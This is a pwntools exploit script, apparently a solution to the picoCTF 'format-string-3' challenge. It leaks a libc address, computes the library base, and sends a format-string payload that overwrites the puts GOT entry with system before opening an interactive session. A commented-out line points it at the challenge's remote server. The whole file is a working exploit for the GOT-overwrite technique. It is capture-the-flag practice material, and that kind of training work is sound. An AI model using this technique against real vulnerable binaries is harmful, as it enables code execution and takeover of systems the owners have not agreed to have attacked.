from pwn import *

context.binary = elf = ELF('./format-string-3', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process("./format-string-3")
#p = remote('rhea.picoctf.net', 62183)

leak = int(p.recvline_contains(b"0x").split()[-1], 16)

libc.address = leak - libc.sym.setvbuf
print(libc.address)

setvbuf_to_system = int('0x2ac90', 16)

system_offset = libc.sym.system

puts_got = elf.got.puts

offset = 38
target = puts_got
value = system_offset

payload = fmtstr_payload(offset, {target:value},write_size='byte')
print(payload)
p.sendline(payload)

p.interactive()
